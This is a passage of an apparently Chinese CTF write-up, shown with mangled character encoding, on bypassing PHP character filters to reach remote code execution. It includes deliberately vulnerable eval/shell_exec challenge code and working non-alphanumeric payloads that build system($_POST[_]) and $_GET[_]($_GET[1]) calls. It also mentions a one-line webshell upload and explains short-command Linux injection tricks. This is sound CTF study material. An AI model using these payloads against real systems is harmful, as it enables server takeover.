class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ä»ç¬¬å…­ä½å¼€å§‹æ£€æŸ¥æ–‡ä»¶å†…å®¹ï¼Œç„¶åå°†å†…å®¹æ”¾è¿›é»‘åå•é‡Œéå†</p><p>æ–‡ä»¶ä¸Šä¼ æˆåŠŸåå°†æ–‡ä»¶åç¼€æ”¹ä¸º<code>php</code>ï¼Œä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬å³å¯æˆåŠŸ</p><p>fuzzå‘ç°åªå‰©ä¸‹<code>$</code>ã€<code>(</code>ã€<code>)</code>ã€<code>.</code>ã€<code>;</code>ã€<code>=</code>ã€<code>[</code>ã€<code>]</code>ã€<code>_</code>ã€<code>~</code></p><p>å› ä¸ºæ²¡æœ‰æ•°å­—ï¼Œæ‰€ä»¥å…ˆæ„é€ æ•°å­—ä»¥å–ç´¢å¼•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[]; </span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>; </span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>);<span class="comment">// ä¸ç›¸ç­‰è¿”å›0ï¼Œæ„é€ ç´¢å¼•0</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>);<span class="comment">// ç›¸åŒè¿”å›1ï¼Œæ„é€ ç´¢å¼•1</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line"><span class="variable">$__</span>=[];<span class="variable">$____</span>=<span class="variable">$__</span>==<span class="variable">$__</span>;</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=~(èŒ«)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(å†·)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(èŒ«)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(æ‹¥)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(æš—)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(å’Œ)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#system</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span>=~(æ ¼)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(å¯‚)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(æ°¸)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(æ¬¢)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(ç«Ÿ)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#_POST</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$$___</span>[_]);</span><br><span class="line"><span class="comment">#system($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>æ³¨é‡Šå»æ‰ä¸Šä¼ </p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082245288.png" alt="image-20221008224501227"></p><p>Th1s_14_f14gé‡Œé¢æ˜¯ä¸€ä¸ªé”™è¯¯çš„flag</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082019088.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç¯å¢ƒé—®é¢˜ï¼Œè¯»ç¯å¢ƒå˜é‡<code>env</code>å¯ä»¥è¯»å‡ºæ¥</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082019995.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="phpè‡ªå¢è‡ªå‡getshell"><a href="#phpè‡ªå¢è‡ªå‡getshell" class="headerlink" title="phpè‡ªå¢è‡ªå‡getshell"></a>phpè‡ªå¢è‡ªå‡getshell</h2><p>phpä¸­é€šè¿‡è‡ªå¢è‡ªå‡å¯ä»¥æ„é€ å­—ç¬¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$__</span>;</span><br><span class="line"><span class="comment">//output: B</span></span><br></pre></td></tr></table></figure><p>æ„æ€æ˜¯åªè¦æœ‰ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡è‡ªå¢è‡ªå‡æ„é€ å‡ºå…¶ä»–å­—ç¬¦ï¼Œé—®é¢˜å°±è½¬åŒ–ä¸ºäº†æ€ä¹ˆè·å¾—è¿™ä¸€ä¸ªå­—ç¬¦</p><p>phpä¸­å¼ºè¡Œæ‹¼æ¥ä¸¤ä¸ªç©ºæ•°ç»„æˆ–è€…å¼ºè¡Œæ‹¼æ¥å­—ç¬¦ä¸²å’Œæ•°ç»„ä¼šå°†æ•°ç»„å¼ºè¡Œè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè¿”å›å­—ç¬¦ä¸²<code>Array</code></p><p>eg.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=[].[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//output:string(10) &quot;ArrayArray&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;&#x27;</span>.[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//output:string(5) &quot;Array&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Challenge-rce"><a href="#Challenge-rce" class="headerlink" title="Challenge__rce"></a>Challenge__rce</h3><p>3ä¸ªç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.ç©ºæ•°ç»„æ‹¼æ¥æ„é€ å­—æ¯&#x27;A&#x27;</span><br><span class="line">2.å¸Œè…Šå­—æ¯ç¼©å‡å­—ç¬¦é•¿åº¦</span><br><span class="line">3.chr()å‡½æ•°æ„é€ å­—æ¯</span><br></pre></td></tr></table></figure><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$rce</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$rce</span>) &lt;= <span class="number">120</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$rce</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;Are you hack me?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;I want string!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;too long!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rce=$_=([].[])[0];++$_;$Î³=++$_;++$_;$Î²=++$_;++$_;$Î¦=++$_;$_=($Î³.++$_.$_=($_.[])[2]);$_=$&#123;_.$Î¦.$Î².$_(84)&#125;;$_[_]($_[1]);</span><br></pre></td></tr></table></figure><p>ç®€å•åˆ†æä¸€ä¸‹</p><p>éš¾ç‚¹æ˜¯åœ¨äºå¯¹å‚æ•°é•¿åº¦çš„é™åˆ¶ï¼Œç”±äºè¿‡æ»¤äº†æ‰€æœ‰å­—æ¯ï¼Œæ‰€ä»¥æ„é€ å‡ºä¸€ä¸ªå¯ç”¨å­—æ¯æ˜¯æ­¤é¢˜çš„å…³é”®</p><p>phpä¸­å¼ºè¡Œæ‹¼æ¥ä¸¤ä¸ªç©ºæ•°ç»„æˆ–è€…å¼ºè¡Œæ‹¼æ¥å­—ç¬¦ä¸²å’Œæ•°ç»„ä¼šå°†æ•°ç»„å¼ºè¡Œè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè¿”å›å­—ç¬¦ä¸²<code>Array</code></p><p>eg.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=[].[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//output:string(10) &quot;ArrayArray&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;&#x27;</span>.[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//output:string(5) &quot;Array&quot;</span></span><br></pre></td></tr></table></figure><p>ç”±äºæ­¤é¢˜è¿‡æ»¤äº†å¼•å·ï¼Œæ‰€ä»¥è¿™é‡Œé€‰æ‹©ç©ºæ•°ç»„æ‹¼ç©ºæ•°ç»„çš„æ–¹å¼</p><p>å› ä¸ºæ•°å­—è¿˜åœ¨æ‰€ä»¥å¯ä»¥å–ç´¢å¼•ï¼Œè¿™æ ·å°±æ‹¿åˆ°äº†å­—æ¯<code>A</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=[].[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//output:string(1) &quot;A&quot;</span></span><br></pre></td></tr></table></figure><p>æœ‰äº†å­—æ¯ï¼Œæ„é€ å°±ç®€å•äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=([].[])[<span class="number">0</span>]; <span class="comment">//A</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line">$Î³=++<span class="variable">$_</span>;<span class="title function_ invoke__">var_dump</span>($Î³); <span class="comment">//C</span></span><br><span class="line">++<span class="variable">$_</span>;$Î²=++<span class="variable">$_</span>;<span class="title function_ invoke__">var_dump</span>($Î²); <span class="comment">//E</span></span><br><span class="line">++<span class="variable">$_</span>;$Î¦=++<span class="variable">$_</span>;<span class="title function_ invoke__">var_dump</span>($Î¦); <span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>=($Î³.++<span class="variable">$_</span>.<span class="variable">$_</span>=(<span class="variable">$_</span>.[])[<span class="number">2</span>]);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>); <span class="comment">//CHr</span></span><br><span class="line"><span class="variable">$_</span>=$&#123;_.$Î¦.$Î².<span class="variable">$_</span>(<span class="number">84</span>)&#125;; <span class="comment">//chr(84)=T</span></span><br><span class="line"><span class="variable">$_</span>[_](<span class="variable">$_</span>[<span class="number">1</span>]); <span class="comment">//$_GET[_]($_GET[1]);</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210070002920.png" alt="image-20221007000232847"></p><h3 id="shellme-Revenge"><a href="#shellme-Revenge" class="headerlink" title="shellme_Revenge"></a>shellme_Revenge</h3><p>ä¸¤ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.åˆ©ç”¨phpæ•°å€¼æº¢å‡ºæ„é€ å­—æ¯&#x27;N&#x27;</span><br><span class="line">2.passthruå‘½ä»¤æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">107</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç®€å•åˆ†æä¸€ä¸‹</p><p>å­—æ¯å‰©ä¸‹äº†<code>C</code>,æ•°å­—å‰©ä¸‹äº†<code>0-3</code>ï¼ŒåŒæ ·æ˜¯åˆ©ç”¨è‡ªå¢è‡ªå‡</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$_=C;$_++;$C=++$_;$_++;$C_=++$_;$_=(C/C.C)[0];$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;$$_[_]($$_[1]);</span><br></pre></td></tr></table></figure><p>å› ä¸ºå­˜åœ¨é•¿åº¦é™åˆ¶<code>strlen($ctfshow) &lt;= 107</code>ï¼Œæ‰€ä»¥æƒ³åˆ©ç”¨è‡ªå¢è‡ªå‡ä¸€ç»™ä¸€ä¸ªæ‹¼æ¥å­—æ¯æ˜¯ä¸ç°å®çš„ï¼Œéœ€è¦åˆ©ç”¨<code>C</code>æ„é€ å­—æ¯è¡¨åé¢çš„å­—æ¯</p><p>åˆ©ç”¨phpä¸­ä¸€äº›æ•°å­¦ä¸Šçš„trick</p><p>åœ¨phpä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.PHPè®¤ä¸ºç»“æœæ˜¯æ— é™å¤§æ—¶ï¼Œè¾“å‡ºï¼šINFï¼ˆInfiniteï¼‰ </span><br><span class="line">2.å½“ä¸€ä¸ªæ•°è¶…å‡ºInfiniteï¼Œè¾“å‡º: double(NAN)       //NAN =&gt; not a number</span><br></pre></td></tr></table></figure><p>è€Œä¸¤ä¸ªå­—æ¯ç›¸é™¤éƒ½ä¼šè¢«è®¤ä¸ºæ˜¯<code>NAN</code>ï¼Œå…¶ä¸­è¿˜åŒ…æ‹¬<code>0/0=NAN</code></p><p>å› ä¸ºè¿”å›çš„NANæ˜¯doubleç±»å‹ï¼Œæƒ³è·å¾—å•ä¸ªå­—ç¬¦éœ€è¦æ‹¼æ¥ä¸€ä¸ªå­—ç¬¦ä¸Šå»ï¼Œä¸ç„¶è¿”å›çš„æ˜¯NULL</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=(C/C)[<span class="number">0</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//output:NULL</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=(C/C.C)[<span class="number">0</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//output:string(1) &quot;N&quot;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ‹¿åˆ°äº†<code>N</code>,å‰©ä¸‹çš„å°±æ­£å¸¸æ„é€ å°±è¡Œäº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=C;  <span class="comment">//C</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$C</span>=++<span class="variable">$_</span>;  <span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$C_</span>=++<span class="variable">$_</span>;  <span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>=(C/C.C)[<span class="number">0</span>];  <span class="comment">//N</span></span><br><span class="line"><span class="variable">$_</span>++; </span><br><span class="line"><span class="variable">$_</span>++;  </span><br><span class="line"><span class="variable">$_</span>++;  </span><br><span class="line"><span class="variable">$_</span>++;  </span><br><span class="line"><span class="variable">$_</span>++;  </span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$C_</span>.<span class="variable">$C</span>.++<span class="variable">$_</span>;  <span class="comment">//$_GET</span></span><br><span class="line"><span class="variable">$$_</span>[_](<span class="variable">$$_</span>[<span class="number">1</span>]);  <span class="comment">//$_GET[_]($_GET[1])</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†systemï¼Œç”¨<code>passthru</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210071206732.png" alt="image-20221007120622652"></p><h1 id="æœ‰é™å­—ç¬¦ä¸‹çš„RCE"><a href="#æœ‰é™å­—ç¬¦ä¸‹çš„RCE" class="headerlink" title="æœ‰é™å­—ç¬¦ä¸‹çš„RCE"></a>æœ‰é™å­—ç¬¦ä¸‹çš„RCE</h1><p>åœ¨ç½‘é¼æ—¶é‡åˆ°ä¸€ä¸ªå››å­—ç¬¦rceçš„é¢˜ç›®ï¼Œå½“æ—¶æ²¡åšå‡ºæ¥ï¼Œæ•…åœ¨èµ›åå¤ç°æ—¶å†™ä¸‹æ€»ç»“ã€‚</p><h2 id="Linuxå‘½ä»¤æµ…æ"><a href="#Linuxå‘½ä»¤æµ…æ" class="headerlink" title="Linuxå‘½ä»¤æµ…æ"></a>Linuxå‘½ä»¤æµ…æ</h2><p><strong>é‡å®šå‘ç¬¦(&gt;&#x2F;&gt;&gt;)</strong></p><p><code>linux</code>ä¸­ï¼Œé‡å®šå‘ç¬¦<code>&gt;/&gt;&gt;</code>å…·æœ‰åˆ›å»ºæ–‡ä»¶çš„åŠŸèƒ½ï¼Œä¸”åœ¨å…¶å‰é¢å¯æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œç„¶åå°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœå†™å…¥åˆ°æŒ‡å®šæ–‡ä»¶ä¸­</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082254744.png" alt="image-20221008225412701"></p><p>å…¶ä¸­<code>&gt;</code>å‘½ä»¤ä¼šå°†åŸæœ‰æ–‡ä»¶å†…å®¹è¦†ç›–,<code>&gt;&gt;</code>ä¼šå°†å­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶å†…å®¹æœ«å°¾ï¼Œä¸ä¼šè¦†ç›–åŸæœ‰çš„å†…å®¹</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031778.png" alt="image-20220831115455419"></p><p><strong>shæ‰§è¡Œå‘½ä»¤</strong></p><p><code>linux</code>ä¸­<code>sh</code>å‘½ä»¤ä¼šå°†æ–‡ä»¶ä¸­çš„å†…å®¹å½“ä½œå‘½ä»¤æ¥æ‰§è¡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082254293.png" alt="image-20221008225424251"></p><p><strong>ls [é€‰é¡¹] [ç›®å½•å]</strong></p><p><code>linux</code>ä¸­<code>ls</code>é»˜è®¤æŒ‰ç…§å­—æ¯é¡ºåºæ’åºï¼Œ<code>-t</code>å‚æ•°ä»¥æ–‡ä»¶ä¿®æ”¹æ—¶é—´æ’åºï¼Œæ–°åˆ›å»ºçš„æ–‡ä»¶åœ¨å‰é¢ï¼Œ<code>-h</code>å‚æ•°ä»¥æ˜“è¯»çš„æ–¹å¼æ˜¾ç¤ºæ–‡ä»¶æˆ–ç›®å½•å¤§å°ï¼Œå¦‚ 1KBã€234MBã€2GB ç­‰ã€‚<code>-h</code>å‚æ•°ä¸»è¦çš„ä½œç”¨æ˜¯è°ƒæ•´<code>-t</code>å‚æ•°ä½ç½®ï¼Œä¸‹æ–‡ä»¥å…·ä½“ä¾‹å­è¿›è¡Œåˆ†æ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082254083.png" alt="image-20221008225431045"></p><p><strong>æ˜Ÿå·(*)</strong></p><p><code>linux</code>ä¸­<code>*</code>å¯ä½œä¸ºé€šé…ç¬¦ä½¿ç”¨ï¼Œåœ¨è¾“å…¥<code>*</code>åï¼Œ<code>linux</code>ä¼šå°†è¯¥ç›®å½•ä¸‹ç¬¬ä¸€ä¸ªæ–‡ä»¶åä½œä¸ºå‘½ä»¤ï¼Œå‰©ä¸‹çš„çš„æ–‡ä»¶åå½“ä½œå‚æ•°</p><p>å¦‚ä¸‹ä¾‹å­æ‰§è¡Œ<code>*</code>å³æ˜¯ç›¸å½“äºæ‰§è¡Œäº†<code>ls -t</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031785.png" alt="image-20220831121538955"></p><p><strong>åæ–œæ <code>\</code>å®ç°å‘½ä»¤æ¢è¡Œ</strong></p><p><code>linux</code>ä¸­ï¼Œæ‰§è¡Œå‘½ä»¤æ—¶ï¼Œå¯ä»¥åœ¨æ²¡æœ‰å†™å®Œçš„å‘½ä»¤åé¢åŠ <code>\</code>ï¼Œå®ç°å°†ä¸€æ¡å‘½ä»¤å¤šè¡ŒåŒ–ï¼Œä»¥è¡Œæœ«æ²¡æœ‰<code>\</code>ä¸ºç»ˆæ­¢</p><p>å¦‚ä¸‹ç›¸å½“äºæ‰§è¡Œäº†<code>cat flag.txt</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082254616.png" alt="image-20221008225446574"></p><p><strong>rev</strong></p><p><code>linux</code>ä¸­,åˆ©ç”¨<code>rev</code>å¯å°†æ–‡ä»¶å†…å®¹å€’ç½®ï¼ŒåŒæ—¶å¯ä»¥é…åˆ<code>&gt;</code>,<code>*</code>ä½¿ç”¨</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082254944.png" alt="image-20221008225453900"></p><p><strong>dir</strong></p><p><code>linux</code>ä¸­,<code>dir</code>å‘½ä»¤å’Œlsæ•ˆæœåŸºæœ¬ä¸€æ ·ï¼Œåªæœ‰é…åˆé‡å®šå‘ç¬¦å†™å…¥æ–‡ä»¶æ—¶æœ‰ä¸€äº›å·®åˆ«ï¼Œ<code>ls</code>å†™å…¥æ–‡ä»¶ä¸­æ—¶ï¼Œæ¯ä¸ªæ–‡ä»¶åéƒ½æ˜¯å•ç‹¬ä¸€è¡Œï¼Œå®ƒä¼šè‡ªåŠ¨æ¢è¡Œï¼Œæœ‰æ—¶ä¼šå½±å“åˆ°æˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œï¼Œè€Œ<code>dir</code>ä¼šæŠŠå†…å®¹å…¨éƒ¨å†™å…¥ä¸€è¡Œä¸­ï¼ŒåŒæ—¶ä¼šè‡ªåŠ¨è¡¥å…¨ç©ºæ ¼</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082255621.png" alt="image-20221008225540577"></p><h2 id="äº”å­—ç¬¦"><a href="#äº”å­—ç¬¦" class="headerlink" title="äº”å­—ç¬¦"></a>äº”å­—ç¬¦</h2><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])&lt;=<span class="number">5</span> &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/rm/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span 